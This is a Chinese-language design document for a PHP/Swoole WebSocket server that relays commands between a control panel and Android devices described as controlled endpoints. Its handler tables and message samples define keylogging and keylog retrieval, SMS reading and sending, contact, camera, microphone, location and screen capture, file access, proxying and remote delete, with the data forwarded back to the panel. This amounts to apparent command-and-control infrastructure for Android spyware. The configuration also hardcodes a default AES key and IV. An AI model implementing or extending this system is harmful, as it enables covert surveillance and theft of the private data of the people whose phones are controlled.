# PHP WebSocket 服务器实现文档

> 本文档描述从 Node.js 迁移到 PHP + Swoole 的 WebSocket 服务器实现。

## 概述

基于 **Swoole** 扩展实现的高性能 WebSocket 服务器，完全兼容原 Node.js 协议，用于管理面板与 Android 设备之间的实时双向通信。

### 技术栈

| 组件 | 技术 | 说明 |
|------|------|------|
| 运行时 | PHP 8.2+ + Swoole | 高性能异步框架 |
| 框架 | Laravel 12 | 配置、日志、数据库集成 |
| 连接存储 | Swoole\Table | 跨 Worker 共享内存 |
| 状态缓存 | Redis | 设备状态持久化 |
| 加密 | OpenSSL | AES-256-CBC |

### 端口配置

| 服务 | 端口 | 说明 |
|------|------|------|
| WebSocket Server | 8081 | 主服务端口 (避免与旧 Node.js 8080 冲突) |

---

## 系统架构

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   管理面板       │◄───────►│  WebSocket Server │◄───────►│   Android 设备   │
│   (Web 前端)     │         │    (PHP/Swoole)   │         │   (被控端)       │
│   itype=slr_panel│         │    Port: 8081     │         │ itype=Slr_client │
└─────────────────┘         └──────────────────┘         └─────────────────┘
```

### 模块架构

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           Server.php (主入口)                            │
│  - Swoole WebSocket Server 初始化                                        │
│  - 事件处理器注册 (onOpen, onMessage, onClose)                            │
│  - 心跳定时器启动                                                         │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                        MessageRouter.php (消息路由)                       │
│  - JSON 解析                                                             │
│  - subscribe/checkphone → SubscribeHandler                               │
│  - ping (无 itype) → 直接返回 pong                                        │
│  - 根据 itype 分发到对应 Handler                                          │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
            ┌───────────────────────┼───────────────────────┬─────────────────┐
            ▼                       ▼                       ▼                 ▼
┌───────────────────┐   ┌───────────────────┐   ┌───────────────────┐  ┌──────────────┐
│  SubscribeHandler │   │  DeviceHandler    │   │   PanelHandler    │  │PanelSendHandler│
│  (subscribe/      │   │  (Slr_client)     │   │   (slr_panel)     │  │(slr_panelsend)│
│   checkphone)     │   │  - 设备注册        │   │  - join/out/ping  │  │  - 数据操作   │
│  - 面板用户注册    │   │  - ping 处理       │   │  - 屏幕控制       │  │  - 文件/应用  │
│  - 返回设备列表    │   │  - 数据转发到面板  │   │  - 浏览器/代理    │  │  - 摄像头等   │
│  - 返回 stats     │   │                   │   │                   │  │               │
└───────────────────┘   └───────────────────┘   └───────────────────┘  └──────────────┘
            │                       │                       │
            └───────────────────────┼───────────────────────┘
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                     ConnectionManager.php (连接管理)                      │
│  - Swoole\Table 存储连接映射                                              │
│  - 设备/面板注册与断开                                                    │
│  - 消息发送 (sendToDevice, sendToPanels)                                 │
│  - getDeviceListForUser / getDeviceStats                                 │
│  - Redis 状态同步                                                        │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  Services: DeviceStatusService | HeartbeatService | BatteryParser |      │
│            LastPingFormatter | EncryptionService                         │
│  Config: WebSocketConfig                                                 │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 文件结构

```
app/
├── config/
│   └── websocket.php                    # WebSocket 配置
├── app/
│   ├── Console/Commands/
│   │   └── WebSocketServe.php           # Artisan 启动命令
│   ├── Http/Controllers/
│   │   └── WebSocketTokenController.php # Panel WebSocket token 接口
│   ├── Services/
│   │   ├── DeviceTokenService.php       # 设备认证 token (HMAC-SHA256)
│   │   └── PanelTokenService.php        # Panel 认证 token (HMAC-SHA256)
│   └── WebSocket/
│       ├── Server.php                   # Swoole 服务器主类
│       ├── ConnectionManager.php        # 连接管理器
│       ├── MessageRouter.php            # 消息路由分发
│       ├── WebSocketLog.php             # 日志封装
│       ├── Config/
│       │   └── WebSocketConfig.php      # 配置集中访问
│       ├── Handlers/
│       │   ├── SubscribeHandler.php     # 面板订阅 (subscribe/checkphone)
│       │   ├── DeviceHandler.php        # 设备消息处理
│       │   ├── PanelHandler.php         # 面板控制命令
│       │   ├── PanelSendHandler.php     # 面板数据操作
│       │   └── CheckPhoneHandler.php    # 分页设备列表 (保留兼容)
│       └── Services/
│           ├── DeviceStatusService.php  # 设备状态管理
│           ├── HeartbeatService.php     # 心跳检测
│           ├── BatteryParser.php        # 电池字段解析
│           ├── LastPingFormatter.php    # lastPing 格式化
│           └── EncryptionService.php    # AES 加密服务
```

---

## 配置说明

### config/websocket.php

```php
return [
    // 服务器绑定
    'host' => env('WEBSOCKET_HOST', '0.0.0.0'),
    'port' => (int) env('WEBSOCKET_PORT', 8081),

    // Swoole 设置
    // ⚠️ 重要：worker_num 必须为 1，否则跨 Worker 通信会失败
    'settings' => [
        'worker_num' => (int) env('WEBSOCKET_WORKERS', 1),
        'max_connection' => (int) env('WEBSOCKET_MAX_CONNECTIONS', 1024),
        'daemonize' => env('WEBSOCKET_DAEMONIZE', false),
        'log_file' => storage_path('logs/websocket/swoole.log'),
        'log_level' => (int) env('SWOOLE_LOG_LEVEL', 4),
        'heartbeat_check_interval' => (int) env('WEBSOCKET_HEARTBEAT_CHECK_INTERVAL', 25),
        'heartbeat_idle_time' => (int) env('WEBSOCKET_HEARTBEAT_IDLE_TIME', 75),
        'package_max_length' => 10 * 1024 * 1024,
        'buffer_output_size' => 32 * 1024 * 1024,
    ],

    // 心跳配置（设备端每 10 秒发送一次 ping）
    'heartbeat' => [
        'timeout' => (int) env('WEBSOCKET_HEARTBEAT_TIMEOUT', 75),
        'check_interval' => (int) env('WEBSOCKET_HEARTBEAT_CHECK_INTERVAL', 25),
        'probe_interval' => (int) env('WEBSOCKET_HEARTBEAT_PROBE_INTERVAL', 10),
        'max_probes' => (int) env('WEBSOCKET_HEARTBEAT_MAX_PROBES', 3),
    ],

    // 加密配置 (必须与旧系统一致)
    'encryption' => [
        'key' => env('WEBSOCKET_ENCRYPTION_KEY', '@zxfNM=q>Drm`6VP)!:u-A~;92E<.?wR'),
        'iv' => env('WEBSOCKET_ENCRYPTION_IV', 'G8v!h3*Y.P+pFm/;'),
        'method' => 'AES-256-CBC',
    ],

    // 设备认证 (APK 构建时 HMAC 签名)
    'device_auth' => [
        'secret' => env('DEVICE_AUTH_SECRET', ''),
    ],

    // Panel 认证 (WebSocket 连接 HMAC 签名)
    'panel_auth' => [
        'secret' => env('PANEL_AUTH_SECRET', env('DEVICE_AUTH_SECRET', '')),
        'ttl' => (int) env('PANEL_AUTH_TTL', 300),  // Token 有效期 (秒)
    ],

    // Redis 配置
    'redis' => [
        'connection' => env('WEBSOCKET_REDIS_CONNECTION', 'default'),
        'prefix' => 'ws:',
        'device_status_ttl' => 86400,
    ],

    // 客户端类型标识 (协议兼容)
    'client_types' => [
        'device' => 'Slr_client',
        'panel' => 'slr_panel',
        'panel_send' => 'slr_panelsend',
    ],
];
```

### 环境变量

```bash
# .env
WEBSOCKET_HOST=0.0.0.0
WEBSOCKET_PORT=8081
WEBSOCKET_WORKERS=1  # 必须为 1，详见下方说明
WEBSOCKET_LOG_MESSAGES=false
DEVICE_AUTH_SECRET=your-random-secret-key  # 设备认证密钥（生产环境必须设置强随机值）
PANEL_AUTH_SECRET=your-panel-secret-key   # Panel 认证密钥（默认回退到 DEVICE_AUTH_SECRET）
PANEL_AUTH_TTL=300                        # Panel token 有效期（秒，默认 5 分钟）

# 心跳配置
# 心跳源：设备端 APK 每 10 秒发一次 ping，Web 面板全局连接每 30 秒，设备控制面板每 5 秒
WEBSOCKET_HEARTBEAT_CHECK_INTERVAL=25    # 检测频率（秒）：定时器每隔多少秒扫描一次所有在线设备
WEBSOCKET_HEARTBEAT_IDLE_TIME=75         # Swoole 原生空闲超时（秒）：TCP 连接无数据超过此时间自动断开（需大于面板 30 秒心跳间隔）
WEBSOCKET_HEARTBEAT_TIMEOUT=75           # 应用层心跳超时（秒）：设备停止发送 ping 超过此时间判定离线（设备每 10 秒 ping，75 秒可容错 7 次丢包）
WEBSOCKET_HEARTBEAT_PROBE_INTERVAL=10    # 探测间隔（秒）：设备疑似离线时发送探测包的间隔
WEBSOCKET_HEARTBEAT_MAX_PROBES=3         # 最大探测次数：连续探测无响应达到此次数后强制断开
```

---

## Swoole 多 Worker 限制

> ⚠️ **重要**: 当前实现要求 `worker_num = 1`，否则设备在线状态判断和跨进程消息发送会失败。

### 问题描述

在 Swoole 多 Worker 模式下（worker_num > 1），会遇到以下问题：

1. **`isEstablished($fd)` 跨 Worker 失效**: 只能检查当前 Worker 管理的连接，其他 Worker 的连接会返回 `false`
2. **`$server->push($fd)` 跨 Worker 失败**: 尝试向其他 Worker 管理的连接发送消息会报错 `session#X does not exist`

### 问题现象

```
// 设备连接到 Worker 0，管理端连接到 Worker 1
// Worker 1 查询设备状态时：
$deviceFd = $this->connectionManager->getDeviceFd($phoneId);  // 返回正确的 fd
$server->isEstablished($deviceFd);  // 返回 false (跨 Worker)
$server->push($deviceFd, $data);    // 报错: session#X does not exist
```

### 解决方案对比

| 方案 | 复杂度 | 适用场景 | 当前状态 |
|------|--------|----------|----------|
| **单 Worker 模式** | 低 | 中小规模 (<1000 连接) | ✅ 已实现 |
| Redis Pub/Sub | 中 | 大规模、多节点 | ⏳ 待实现 |
| Swoole Task Worker | 中 | 大规模、单节点 | ⏳ 待实现 |
| Swoole sendMessage | 中 | 大规模、单节点 | ⏳ 待实现 |

### 当前实现：单 Worker 模式

```php
// config/websocket.php
'settings' => [
    'worker_num' => 1,  // 所有连接在同一个 Worker 中处理
],
```

**优点**:
- 实现简单，无需额外的 IPC 机制
- `isEstablished()` 和 `push()` 正常工作
- Swoole Table 共享内存正常工作

**缺点**:
- 单进程处理所有请求，CPU 利用率受限
- 适合中小规模部署（几百个并发连接）

### 未来优化：Redis Pub/Sub 方案

如果需要支持大规模连接或多节点部署，可以实现 Redis Pub/Sub：

```php
// 发送消息时发布到 Redis
public function sendToDevice(string $phoneId, array $data): bool
{
    $channel = "ws:device:{$phoneId}";
    Redis::publish($channel, json_encode($data));
    return true;
}

// 每个 Worker 订阅 Redis 并处理
public function onWorkerStart(SwooleServer $server, int $workerId): void
{
    go(function () use ($server) {
        $redis = new \Redis();
        $redis->psubscribe(['ws:device:*'], function ($redis, $pattern, $channel, $message) use ($server) {
            $phoneId = str_replace('ws:device:', '', $channel);
            $fd = $this->connectionManager->getDeviceFd($phoneId);
            if ($fd !== null && $server->isEstablished($fd)) {
                $server->push($fd, $message);
            }
        });
    });
}
```

### 关键代码修改点

**1. Server.php - 共享表初始化**

Swoole Table 必须在 `$server->start()` **之前** 创建，才能在所有 Worker 间共享：

```php
public function __construct()
{
    $this->server = new SwooleServer($host, $port);
    
    // 关键：在 server->start() 之前创建共享表
    $this->initializeSharedTables();
    
    $this->connectionManager = new ConnectionManager($this->server, [
        'fdToPhoneId' => $this->fdToPhoneId,
        'phoneIdToFd' => $this->phoneIdToFd,
        // ...
    ]);
}
```

**2. PanelHandler.php - 在线状态判断**

使用共享表判断设备是否在线，而不是 `isEstablished()`：

```php
private function handlePing(int $fd, string $phoneId): void
{
    // ❌ 错误：跨 Worker 会返回 false
    // $serverToPhone = $server->isEstablished($deviceFd) ? 'OPEN' : 'CLOSED';
    
    // ✅ 正确：使用共享表判断
    $isOnline = $this->connectionManager->isDeviceOnline($phoneId);
    $serverToPhone = $isOnline ? 'OPEN' : 'CLOSED';
}
```

---

## 核心类说明

### Server.php

Swoole WebSocket 服务器主类，负责：
- 初始化 Swoole\WebSocket\Server
- 注册事件处理器 (onStart, onWorkerStart, onOpen, onMessage, onClose)
- 启动心跳检测定时器

```php
// 启动服务器
$server = new \App\WebSocket\Server();
$server->start();
```

### ConnectionManager.php

连接管理器，使用 Swoole\Table 实现跨 Worker 共享：

| Table | 键 | 值 | 用途 |
|-------|-----|-----|------|
| fdToPhoneId | fd (string) | phone_id, client_type | fd → 设备ID 映射 |
| phoneIdToFd | phone_id | fd (int) | 设备ID → fd 映射 |
| panelSubscriptions | fd (string) | phone_id | 面板订阅关系 (单设备控制) |
| panelUserSubscriptions | fd (string) | email_encrypted, is_admin, user_id | Panel 用户订阅 (推送模式) |

**主要方法：**

```php
// 注册设备连接
$connectionManager->registerDevice($fd, $phoneId);

// 注册面板订阅 (单设备控制)
$connectionManager->registerPanel($fd, $phoneId);

// 注册 Panel 用户订阅 (推送模式)
$connectionManager->registerPanelUser($fd, $emailEncrypted, $isAdmin, $userId);

// 获取已认证的面板用户信息
$connectionManager->getPanelUser($fd);  // 返回 ['email_encrypted', 'is_admin', 'user_id'] 或 false

// 设备权限校验 (admin 放行，普通用户校验 device.user_id)
$connectionManager->isPanelAuthorizedForDevice($fd, $phoneId);

// 发送消息到设备
$connectionManager->sendToDevice($phoneId, ['type' => 'xxx', ...]);

// 发送消息到所有订阅面板 (单设备)
$connectionManager->sendToPanels($phoneId, ['type' => 'xxx', ...]);

// 推送设备上线/离线通知给相关 Panel 用户（deviceOnline 使用 formatForPanel 的 phoneInfo 完整信息）
$connectionManager->notifyPanelUsersDeviceOnline($phoneId, $userId, $phoneInfo);
$connectionManager->notifyPanelUsersDeviceOffline($phoneId, $userId);

// 获取设备列表和统计 (供 SubscribeHandler 使用)
$connectionManager->getDeviceListForUser($userId);  // 返回 formatDeviceForList 格式
$connectionManager->getDeviceStats($userId);        // { total, online, offline }

// 获取设备客户端 IP (支持 IPv6-mapped IPv4 转换)
$connectionManager->getClientIp($phoneId);
```

### WebSocketConfig.php

集中访问 WebSocket 相关配置，便于测试和避免硬编码：

```php
WebSocketConfig::redisPrefix();
WebSocketConfig::deviceStatusTtl();
WebSocketConfig::deviceStatusKey($phoneId);
WebSocketConfig::lastNotifiedKey($phoneId);
WebSocketConfig::heartbeatCheckInterval();
WebSocketConfig::heartbeatTimeout();
WebSocketConfig::clientTypes();
```

### BatteryParser.php / LastPingFormatter.php

工具类，供 ConnectionManager、DeviceStatusService 等复用：

- `BatteryParser::parseLevel($batteryCharge)` - 解析电池电量
- `BatteryParser::parseCharging($batteryCharge)` - 判断是否充电中
- `LastPingFormatter::format($lastPingMs)` - 格式化 lastPing 为 `Y-m-d H:i:s`

### MessageRouter.php

消息路由分发器，使用 `WebSocketConfig::clientTypes()` 获取客户端类型：

```php
// 路由逻辑
if ($subc === 'subscribe' || $subc === 'checkphone') {
    $this->subscribeHandler->handle($fd, $data);  // 两者统一由 SubscribeHandler 处理
    return;
}
if ($subc === 'ping' && $itype === null) {
    $this->connectionManager->send($fd, ['type' => 'pong', 'timestamp' => time()]);
    return;
}

// Panel 认证拦截：slr_panel / slr_panelsend 消息需要已认证的连接
// 未认证的 fd 尝试从消息中提取 token 进行内联认证
// 认证失败则拒绝消息
if ($itype === 'slr_panel' || $itype === 'slr_panelsend') {
    if (!$this->connectionManager->getPanelUser($fd)) {
        // 尝试内联 token 认证 (join 消息携带 token)
        // 认证失败 → 返回错误，拒绝处理
    }
}

// 根据 itype 分发到 DeviceHandler / PanelHandler / PanelSendHandler
match ($itype) {
    'Slr_client' => $this->deviceHandler->handle($fd, $data),
    'slr_panel' => $this->panelHandler->handle($fd, $data),
    'slr_panelsend' => $this->panelSendHandler->handle($fd, $data),
    default => $this->handleUnknownType($fd, $itype),
};
```

### HeartbeatService.php

心跳检测服务，使用 `WebSocketConfig::heartbeatCheckInterval()` 和 `heartbeatTimeout()`：

```php
// 记录设备 ping
$heartbeatService->recordPing($phoneId);

// 检查所有设备 (由 Server 定时器调用)
$heartbeatService->checkAll();
// 超过 timeout 秒无心跳 → 直接断开连接
```

---

## Handler 详解

### DeviceHandler (Slr_client)

处理设备端消息：

| subc | 处理逻辑 |
|------|----------|
| `ping` | 更新心跳时间，解析设备状态，推送给订阅面板 |
| 其他 | 转发到订阅的管理面板 |

**Device → Panel 字段映射：**

```php
// 消息类型映射
'klogs' → type: 'klog', data: msg
'mic' → type: 'mic', data: voip (不是 msg)
'screen'/'screenshot' → type: subc, data: img, wmob, hmob
'cam' → type: 'cam', data: img
'thumb' → type: 'thumb', data: msg, path: pth
'srch' → type: 'srch', data: pths, sfor: stype
'down' → 文件下载分片字段
'proxy' → 根据 ctype (first/state/dataup) 返回不同结构
```

### PanelHandler (slr_panel)

处理面板控制命令：

| subc | 功能 | 转发格式 |
|------|------|----------|
| `join` | 订阅设备 | 返回 joinResponse |
| `out` | 退出控制 | type: screencomd, subc: out |
| `ping` | 状态查询 | 返回 statusBatch |
| `disag` | 断开设备 | 关闭设备连接 |
| `screen` | 屏幕控制 | type: screen, subc: xxx |
| `brows` | 浏览器控制 | type: brows, subc: h/n |
| `proxy` | 代理控制 | type: proxy, subc: 1/0 |
| `bc` | 广播通知 | type: bc, subc: A/N |

**statusBatch 返回格式：**

```php
[
    'type' => 'statusBatch',
    'pid' => $phoneId,
    'serverToPhone' => 'OPEN' | 'CLOSED' | 'UNKNOWN',
    'lastPing' => 'Y-m-d H:i:s',
    'phoneInfo' => [...],
]
```

### PanelSendHandler (slr_panelsend)

处理面板数据操作命令：

| subc | 功能 | 特殊处理 |
|------|------|----------|
| `screen` | 屏幕共享 | screentype 参数 |
| `cam`/`camoff` | 摄像头 | SelectedCam 参数 |
| `mic`/`micoff` | 麦克风 | - |
| `loc`/`locoff` | 定位 | - |
| `SMS` | 获取短信 | - |
| `SMSSEND` | 发送短信 | smsnumber, message |
| `Contacts` | 获取联系人 | - |
| `files` | 文件列表 | filepath |
| `changefiles` | 文件操作 | 上传分片 (256KB/chunk) |
| `Keylog` | 键盘监听控制 | keylogtype: '1'=开启, '0'=关闭 |
| `Logdate` | 按日期查询键盘记录 | keylogdate: 'YYYY-MM-DD' |
| `LOADAPPS` | 应用列表 | - |
| `OPENAPP` | 打开应用 | packageName |
| `activz`/`notifys`/`vapps`/`vlinks` | 活动记录 | 映射到 Activitys 类型 |
| `Permissions` | 权限管理 | subc=R 时发送 |
| `delete` | 远程删除 | type: Delete, subc: [reme] |
| `Notify` | 通知控制 | type: Notifi |

#### 键盘监听详解

键盘记录数据**存储在设备端**，服务器仅做转发，不存储任何键盘数据。

**开启/关闭监听：**
```php
// Panel → Server → Device
{
    "itype": "slr_panelsend",
    "subc": "Keylog",
    "pid": "device-uuid",
    "keylogtype": "1"  // '1'=开启, '0'=关闭
}

// Server 转发到设备
{
    "type": "screencomd",
    "subc": "Keylog",
    "keylogtype": "1"
}
```

**按日期查询：**
```php
// Panel → Server → Device
{
    "itype": "slr_panelsend",
    "subc": "Logdate",
    "pid": "device-uuid",
    "keylogdate": "2026-02-01"
}

// Server 转发到设备
{
    "type": "screencomd",
    "subc": "Logdate",
    "keylogtype": "0",
    "keylogdate": "2026-02-01"
}
```

**设备返回数据：**
```php
// Device → Server (subc: klogs)
{
    "itype": "Slr_client",
    "subc": "klogs",
    "pid": "device-uuid",
    "msg": "[{\"time\":\"...\",\"app\":\"...\",\"action\":\"...\",\"status\":\"...\"}]"
}

// Server → Panel (type: klog)
{
    "type": "klog",
    "data": "[{\"time\":\"...\",\"app\":\"...\",\"action\":\"...\",\"status\":\"...\"}]",
    "pid": "device-uuid"
}
```

### SubscribeHandler

处理面板订阅请求，**subscribe 和 checkphone 统一由此 Handler 处理**。验证 HMAC token 后注册 Panel 用户订阅，并立即返回完整设备列表和统计数据：

```php
// 请求 (subscribe 或 checkphone，必须携带 token)
{
    "subc": "subscribe",  // 或 "checkphone"
    "email": "user@example.com",
    "token": "{hmac}.{user_id}.{guard}.{timestamp}"
}

// 响应 (成功)
{
    "type": "subscribe",
    "success": true,
    "isAdmin": false,
    "devices": [  // 完整设备列表，formatDeviceForList 格式
        {
            "id": 1,
            "uuid": "xxx",
            "name": "...",
            "is_online": true,
            "battery_level": 85,
            "user": { "id": 1, "username": "...", "email": "..." },
            ...
        }
    ],
    "stats": {
        "total": 10,
        "online": 3,
        "offline": 7
    }
}

// 响应 (认证失败)
{
    "type": "subscribe",
    "success": false,
    "error": "Authentication failed"
}
```

**流程**：验证 token (HMAC + TTL) → 查库确认用户存在 → 判断 isAdmin → 注册 `registerPanelUser($fd, $ownerEmail, $isAdmin, $ownerId)` → 调用 `getDeviceListForUser` / `getDeviceStats` → 返回 devices + stats。

### CheckPhoneHandler (保留)

保留用于兼容旧协议，支持分页、过滤。当前 MessageRouter 将 checkphone 路由到 SubscribeHandler，若需分页设备列表可单独调用。

### DeviceStatusService

设备状态管理服务，负责：
- 解析设备 ping 消息中的状态信息
- 同步状态到 Redis 缓存
- **设备认证 token 验证** (首次上线时，通过 `DeviceTokenService` 验证 HMAC 签名)
- **自动创建新设备记录** (认证通过后，通过 token 中的 email 关联用户)
- **触发设备上线/离线推送**
- **新 WebSocket 连接检测** (`isNewWebSocketConnection`) - 用于识别设备重装后的首次连接，确保推送

设备 ping 消息中的 `user_email` 字段格式为 `email||{hmac}.{build_id}.{timestamp}`，服务端会：
1. 在 `updateFromPing()` 中清洗：将原始值存为 `user_email_raw`，`user_email` 只保留纯 email
2. 在 `createDevice()` 中验证：调用 `DeviceTokenService::validateToken()` 校验 HMAC 签名
3. 认证失败时拒绝创建设备记录（`return null`），设备不归属任何用户

```php
// 设备上线时
$deviceStatusService->updateFromPing($phoneId, $encodedData);
// 首次上线 / 从离线恢复 / 新 WebSocket 连接 → notifyPanelUsersDeviceOnline()

// 标记设备离线
$deviceStatusService->markOffline($phoneId);
```

---

## 启动与运行

### 启动命令

```bash
# 使用 Sail
./vendor/bin/sail artisan websocket:serve

# 指定端口
./vendor/bin/sail artisan websocket:serve --port=8082

# 直接运行 (需要 Swoole 扩展)
php artisan websocket:serve
```

### 验证 Swoole 安装

```bash
./vendor/bin/sail php -m | grep swoole
./vendor/bin/sail php --ri swoole
```

### 日志查看

```bash
# WebSocket 日志
tail -f storage/logs/websocket.log

# Laravel 日志
tail -f storage/logs/laravel.log
```

### 进程管理

```bash
# 查看 PID
cat storage/app/websocket.pid

# 停止服务器
kill $(cat storage/app/websocket.pid)
```

---

## 与 Node.js 实现对比

### 相同点

| 特性 | Node.js | PHP/Swoole |
|------|---------|------------|
| 消息协议 | JSON | JSON (100% 兼容) |
| 客户端类型 | Slr_client/slr_panel/slr_panelsend | 相同 |
| 心跳超时 | 75 秒 | 75 秒 |
| 检查间隔 | 25 秒 | 25 秒 |
| 加密算法 | AES-256-CBC | AES-256-CBC |
| 加密密钥 | 相同 | 相同 |

### 不同点

| 特性 | Node.js | PHP/Swoole |
|------|---------|------------|
| 端口 | 8080 | 8081 |
| 连接存储 | Map (单进程) | Swoole\Table (多进程共享) |
| 状态持久化 | 内存 | Redis |
| 心跳探测 | 有 probe 机制 | 无 (直接断开) |
| 数据库访问 | 无 | Eloquent ORM |

### 迁移注意事项

1. **端口变更**: 前端需要更新 WebSocket URL 从 `ws://host:8080` 到 `ws://host:8081`
2. **协议兼容**: 消息格式完全兼容，前端和 Android 客户端无需修改
3. **并行运行**: 可以同时运行 Node.js (8080) 和 PHP (8081) 进行对比测试

---

## 数据流示例

### 推送模式架构 (新)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           推送模式完整流程                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. Panel 首次连接                                                          │
│     ┌─────────┐   subscribe     ┌─────────────┐                            │
│     │ Panel A │ ───────────────► │   Swoole    │                            │
│     └─────────┘                  │   Server    │                            │
│          │                       └─────────────┘                            │
│          │                             │                                    │
│          │    registerPanelUser(fd, emailA, isAdmin=false)                  │
│          │    getDeviceListForUser / getDeviceStats                         │
│          │                             │                                    │
│          ◄─────────────────────────────┤                                    │
│     subscribe response (devices + stats)│                                    │
│                                        │                                    │
│  2. 新设备上线                          │                                    │
│     ┌─────────┐      ping             │                                    │
│     │ Device  │ ─────────────────────►│                                    │
│     └─────────┘                       │                                    │
│                                        │                                    │
│          • 验证设备认证 token (HMAC)    │                                    │
│          • 创建数据库记录 (首次,需认证)  │                                    │
│          • 关联用户 (通过 token email)  │                                    │
│          • notifyPanelUsersDeviceOnline()                                   │
│                                        │                                    │
│          ┌─────────────────────────────┘                                    │
│          │                                                                  │
│          ▼  遍历 panelUserSubscriptions                                     │
│     ┌─────────────────────────────────────────────┐                        │
│     │ if (isAdmin || email === deviceOwnerEmail)  │                        │
│     │     send(fd, { type: 'deviceOnline', ... }) │                        │
│     └─────────────────────────────────────────────┘                        │
│          │                                                                  │
│          ▼                                                                  │
│     ┌─────────┐                                                            │
│     │ Panel A │ ◄── deviceOnline { pid, phoneInfo }                        │
│     └─────────┘                                                            │
│                                                                             │
│  3. 设备离线                                                                │
│     ┌─────────┐   disconnect                                               │
│     │ Device  │ ─────────────────────► handleDisconnect()                  │
│     └─────────┘                              │                              │
│                                              │                              │
│          • 更新数据库 is_online = false       │                              │
│          • notifyPanelUsersDeviceOffline()   │                              │
│                                              │                              │
│     ┌─────────┐                              │                              │
│     │ Panel A │ ◄── deviceOffline { pid, phoneInfo: null }                 │
│     └─────────┘                                                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 推送消息格式

**设备上线 (deviceOnline)**（与 deviceUpdate 同构，使用 phoneInfo 完整信息）:
```json
{
  "type": "deviceOnline",
  "pid": "device-123",
  "phoneInfo": {
    "pid": "device-123",
    "phone_name": "Test Device",
    "model": "Pixel 8",
    "battery_charge": "85",
    "is_online": true,
    "lastPing": 1738742400000,
    "ip_location": ""
  },
  "stats": { "total": 10, "online": 2, "offline": 8 }
}
```

**设备离线 (deviceOffline)**:
```json
{
  "type": "deviceOffline",
  "pid": "device-123",
  "phoneInfo": null,
  "stats": { "total": 10, "online": 2, "offline": 8 }
}
```

**设备状态更新 (deviceUpdate)**:
```json
{
  "type": "deviceUpdate",
  "pid": "device-123",
  "phoneInfo": { ... },
  "stats": { "total": 10, "online": 3, "offline": 7 }
}
```

### 用户隔离机制

| 用户类型 | 收到的推送 |
|---------|-----------|
| 普通用户 | 仅自己的设备 (通过 email_encrypted 匹配) |
| 管理员 | 所有设备 (is_admin = true) |

### 设备连接流程 (旧)

```
1. Device → Server: {"itype":"Slr_client","pid":"xxx","subc":"ping","msg":"..."}
2. Server: 注册设备到 ConnectionManager
3. Server: 解析 msg 中的设备状态
4. Server: 更新 Redis 缓存
5. Server → Panels: {"type":"deviceUpdate","pid":"xxx","phoneInfo":{...}}
```

### 面板控制流程

```
1. Panel → Server: {"itype":"slr_panel","pid":"xxx","subc":"join","token":"..."}
2. Server: 注册面板订阅
3. Server → Panel: {"type":"joinResponse","pid":"xxx","is_online":true,"phoneInfo":{...}}
4. Panel → Server: {"itype":"slr_panel","pid":"xxx","subc":"screen","comand":"snap"}
5. Server → Device: {"type":"screen","subc":"snap","snaptype":"1"}
6. Device → Server: {"itype":"Slr_client","pid":"xxx","subc":"screenshot","img":"..."}
7. Server → Panel: {"type":"screenshot","data":"...","pid":"xxx","wmob":"...","hmob":"..."}
```

---

## Panel 连接认证

### 认证架构

Panel（管理面板）WebSocket 连接使用 HMAC-SHA256 token 认证，防止未授权访问：

```
浏览器                    Laravel HTTP                 Swoole WebSocket
  │                          │                              │
  │── GET /ws-token ────────►│                              │
  │   (携带 session cookie)  │                              │
  │◄── { token: "hmac..." } ─│                              │
  │                          │                              │
  │── ws://host:8081 ───────────────────────────────────────►│
  │── subscribe { token } ──────────────────────────────────►│
  │                          │              验证 HMAC + TTL  │
  │                          │              查库确认用户存在  │
  │◄── subscribe response ──────────────────────────────────│
```

### Token 格式

```
{hmac_hex}.{user_id}.{guard}.{timestamp}
```

- `hmac_hex` = `HMAC-SHA256(secret, "user_id|guard|timestamp")`
- `guard` = `web`（普通用户）或 `admin`（管理员）
- TTL 默认 300 秒（5 分钟），可通过 `PANEL_AUTH_TTL` 配置
- 使用 `hash_equals()` 防时序攻击

### PanelTokenService

```php
use App\Services\PanelTokenService;

$service = new PanelTokenService();

// 生成 token
$token = $service->generateToken($userId, 'web');  // 普通用户
$token = $service->generateToken($adminId, 'admin');  // 管理员

// 验证 token
$result = $service->validateToken($token);
// ['authenticated' => true, 'user_id' => 1, 'guard' => 'web']
// ['authenticated' => false, 'error' => 'Token expired']
```

### WebSocketTokenController

HTTP 端点，为已认证用户生成 WebSocket token：

```
GET /ws-token          → 普通用户 (auth:web)
GET /admin/ws-token    → 管理员 (auth:admin)
```

返回：`{ "token": "{hmac}.{user_id}.{guard}.{timestamp}" }`

### 认证流程

1. **subscribe/checkphone**：消息必须携带 `token` 字段，SubscribeHandler 验证后注册 `panelUserSubscriptions`
2. **join**：首条 `slr_panel` 消息携带 `token`，MessageRouter 内联认证后注册 fd
3. **后续消息**：fd 已注册，无需再携带 token
4. **设备权限**：PanelHandler / PanelSendHandler 入口校验 `isPanelAuthorizedForDevice()`
   - 管理员 → 放行所有设备
   - 普通用户 → 仅允许控制自己的设备 (`device.user_id === panel.user_id`)
   - 子账号 → 可控制父账号的设备

---

## 故障排查

### 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 无法启动 | Swoole 未安装 | 重建 Docker 镜像 |
| 连接被拒绝 | 端口未开放 | 检查 docker-compose.yml 端口映射 |
| 设备无法连接 | 协议不匹配 | 检查 itype 值是否正确 |
| 面板收不到数据 | 未订阅设备 | 确保先发送 join 消息 |
| 心跳超时 | 网络不稳定 | 检查设备网络连接 |
| **设备在线但显示离线** | worker_num > 1 | 确保 `worker_num = 1` |
| **session#X does not exist** | 跨 Worker 发送失败 | 确保 `worker_num = 1` |
| **PHP 代码修改后不生效** | Swoole 是常驻内存服务 | 必须重启 WebSocket 服务 |

### 调试模式

```bash
# 启用详细日志
WEBSOCKET_LOG_MESSAGES=true php artisan websocket:serve
```

### 连接状态检查

```php
// 获取连接统计
$connectionManager->getConnectionCount();  // 总连接数
